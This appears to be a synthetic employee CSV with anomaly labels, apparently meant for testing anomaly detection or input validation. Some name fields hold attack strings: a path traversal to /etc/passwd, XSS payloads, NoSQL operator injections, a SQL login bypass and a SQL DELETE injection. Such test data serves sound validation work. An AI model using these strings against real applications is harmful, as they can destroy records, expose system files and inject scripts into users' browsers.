employee_id,name,age,salary,years_experience,department,location,performance_score,projects_completed,days_absent,is_anomaly
EMP01492,John Smith,35,74878,10,HR,New York,8.7,6,8,0
EMP01379,Bob Johnson,28,52928,9,Sales,London,8.2,8,6,0
EMP01187,Jane Garcia,34,92547,4,Finance,New York,7.2,9,3,0
EMP01216,Diana Garcia,75,61971,0,Finance,San Francisco,6.4,12,4,1
EMP01052,Diana Williams,29,62252,8,HR,Tokyo,7.4,13,4,0
EMP01337,Bob Brown,32,50447,9,HR,Tokyo,8.0,10,5,0
EMP01295,Bob Jones,22,73385,29,Sales,Berlin,9.6,10,5,1
EMP01701,Charlie Williams,22,63976,22,HR,San Francisco,8.8,18,4,1
EMP01251,John Brown,42,82916,15,Finance,Tokyo,9.8,9,4,0
EMP01461,Bob Garcia,22,76520,30,Engineering,Berlin,8.2,11,3,1
EMP01455,Jane Brown,28,50807,4,Sales,London,6.7,14,6,0
EMP01797,Charlie Jones,40,116149,3,Operations,Singapore,4.7,4,5,0
EMP01269,Alice Brown,36,81930,6,Engineering,San Francisco,8.4,8,4,0
EMP01201,Alice Williams,39,93492,7,HR,London,8.4,9,7,0
EMP01161,Bob Williams,41,101583,10,Sales,London,7.6,9,4,0
EMP01555,Diana Brown,31,40000,5,HR,New York,10.0,12,4,0
EMP01401,Charlie Jones,30,66411,7,Sales,Tokyo,10.0,11,1,1
EMP01702,Charlie Jones,29,58636,6,HR,Singapore,10.0,20,5,0
EMP01476,John Johnson,39,121386,10,Operations,Singapore,6.1,12,7,0
EMP01105,Jane Garcia,38,75928,7,Operations,New York,6.3,11,5,0
EMP01565,../../../etc/passwd,31,71829,3,Engineering,San Francisco,7.1,12,60,1
EMP01389,Alice Johnson,30,55633,9,Marketing,San Francisco,7.8,12,3,0
EMP01001,John Garcia,33,64679,13,HR,Berlin,7.8,15,3,0
EMP01767,Charlie Williams,49,85318,1,Engineering,New York,7.7,8,5,0
EMP01561,Bob Garcia,51,86585,8,Marketing,Tokyo,6.6,13,10,1
EMP01080,Diana Smith,33,15000,9,Marketing,Singapore,6.6,11,7,1
EMP01205,Diana Jones,27,82869,1,Operations,San Francisco,7.2,11,5,0
EMP01034,John Garcia,41,74306,6,Engineering,Berlin,7.8,13,5,0
EMP01508,John Jones,35,96717,6,Operations,New York,6.8,9,7,0
EMP01427,Charlie Garcia,40,72059,12,Marketing,London,7.4,9,5,0
EMP01454,John Williams,30,196621,0,Marketing,Singapore,9.3,12,4,1
EMP01366,Jane Williams,36,102685,7,Operations,Singapore,7.4,13,3,0
EMP01091,Diana Jones,42,85145,6,HR,Singapore,6.5,8,9,1
EMP01339,<img src=x onerror=alert(1)>,30,350000,8,Operations,Berlin,8.8,13,8,1
EMP01564,Charlie Smith,44,98931,14,Sales,San Francisco,9.3,11,3,0
EMP01345,Alice Williams,36,75311,6,Marketing,New York,7.1,12,4,0
EMP01241,Charlie Garcia,34,65822,0,Marketing,Singapore,7.2,11,7,0
EMP01013,Diana Garcia,22,78931,7,Sales,Berlin,6.1,9,8,0
EMP01315,John Brown,35,82299,5,Marketing,San Francisco,4.3,10,4,0
EMP01600,Bob Williams,41,54061,15,Operations,London,4.6,11,5,0
EMP01387,John Garcia,50,70507,10,HR,London,5.6,18,4,0
EMP01273,Alice Smith,35,49340,11,HR,San Francisco,6.7,50,2,0
EMP01166,Jane Williams,41,61472,16,Engineering,Singapore,6.0,12,5,0
EMP01793,Alice Jones,24,93078,5,HR,Tokyo,6.6,12,7,0
EMP01646,Diana Williams,22,64427,4,Marketing,London,9.2,8,6,0
EMP01484,Diana Johnson,28,59280,5,Sales,Singapore,4.0,10,6,0
EMP01782,Charlie Johnson,38,54683,9,Engineering,San Francisco,5.8,18,9,1
EMP01504,Bob Brown,29,85730,3,Engineering,Tokyo,5.2,12,6,0
EMP01243,Jane Johnson,41,74229,8,Operations,Singapore,6.5,9,6,0
EMP01566,Alice Williams,22,74453,4,HR,Tokyo,8.0,14,7,0
EMP01562,Bob Williams,41,77391,9,Operations,Singapore,6.7,12,5,0
EMP01686,Jane Garcia,33,46632,11,HR,London,7.4,11,7,0
EMP01189,Jane Williams,22,75537,13,HR,London,7.4,11,5,0
EMP01699,Bob Johnson,33,86850,1,Marketing,San Francisco,8.4,12,3,0
EMP01475,Charlie Williams,33,77834,6,Operations,New York,6.1,15,5,0
EMP01681,Diana Garcia,25,67543,5,Finance,Berlin,7.7,17,3,0
EMP01510,Jane Garcia,37,74499,5,Finance,London,6.7,13,8,0
EMP01058,Alice Johnson,37,63955,3,Marketing,Berlin,8.2,14,1,1
EMP01474,{'$ne': null},48,99261,5,Engineering,New York,7.5,3,5,0
EMP01560,Jane Williams,37,74693,3,Engineering,Singapore,6.3,16,3,0
EMP01747,admin'--,28,81035,4,HR,Berlin,6.4,16,6,1
EMP01252,Jane Johnson,51,84880,3,Operations,Singapore,8.3,14,5,0
EMP01021,Jane Williams,33,103186,2,Finance,New York,9.3,10,6,0
EMP01313,John Johnson,41,84913,10,Finance,Berlin,5.4,10,4,0
EMP01459,Bob Jones,25,73884,8,Finance,Tokyo,7.8,14,4,0
EMP01160,Bob Williams,27,87854,14,HR,Berlin,6.0,7,2,0
EMP01276,Charlie Garcia,36,43868,5,Engineering,Tokyo,8.0,9,3,0
EMP01191,Diana Garcia,22,40000,27,Finance,New York,6.8,8,7,1
EMP01385,Bob Williams,36,93815,10,Sales,Tokyo,7.0,15,6,0
EMP01413,Alice Garcia,45,92898,4,Sales,New York,7.0,13,4,0
EMP01491,Alice Brown,46,124859,9,Engineering,Tokyo,4.3,18,6,0
EMP01343,John Garcia,30,77511,6,HR,London,8.3,10,1,1
EMP01769,Diana Smith,49,64418,12,Finance,New York,6.9,10,6,0
EMP01308,Charlie Williams,39,62524,3,Operations,Berlin,7.0,10,3,0
EMP01661,Diana Williams,30,50514,9,Sales,London,7.0,12,6,0
EMP01130,Charlie Johnson,22,63896,7,HR,London,8.2,21,6,0
EMP01663,{'$gt': ''},30,57989,3,Operations,New York,6.7,10,10,1
EMP01099,1'; DELETE FROM employees WHERE '1'='1,33,58661,8,Marketing,Singapore,8.0,11,7,1
EMP01372,Bob Johnson,46,77084,10,Finance,Berlin,7.2,13,5,0
EMP01087,javascript:alert('Hacked'),37,67814,8,Operations,London,7.4,8,4,1
EMP01458,Charlie Williams,30,60899,9,Sales,Singapore,9.3,11,5,0
EMP01330,Diana Jones,34,81427,3,HR,Berlin,9.3,15,5,0
EMP01214,Jane Garcia,32,109719,6,Marketing,Singapore,8.4,20,2,0
EMP01466,<svg onload=alert('XSS')>,39,72775,0,HR,New York,6.2,8,3,1
EMP01121,Charlie Johnson,27,54469,6,Marketing,London,10.0,6,4,0
EMP01614,Jane Brown,54,62129,6,Finance,San Francisco,6.6,16,9,1
EMP01020,Alice Johnson,46,64654,8,Finance,New York,9.1,12,9,1
EMP01700,Jane Johnson,30,500000,12,Engineering,Tokyo,6.4,12,6,1
EMP01071,John Smith,47,59034,6,Marketing,New York,10.0,13,2,0
EMP01106,Bob Jones,50,47802,10,Engineering,New York,10.0,14,9,1
EMP01270,Charlie Jones,46,74061,3,HR,London,6.5,11,6,0
EMP01435,Jane Brown,35,107782,19,Sales,San Francisco,7.1,19,4,0
EMP01102,John Garcia,32,75574,10,Engineering,San Francisco,7.0,12,6,0
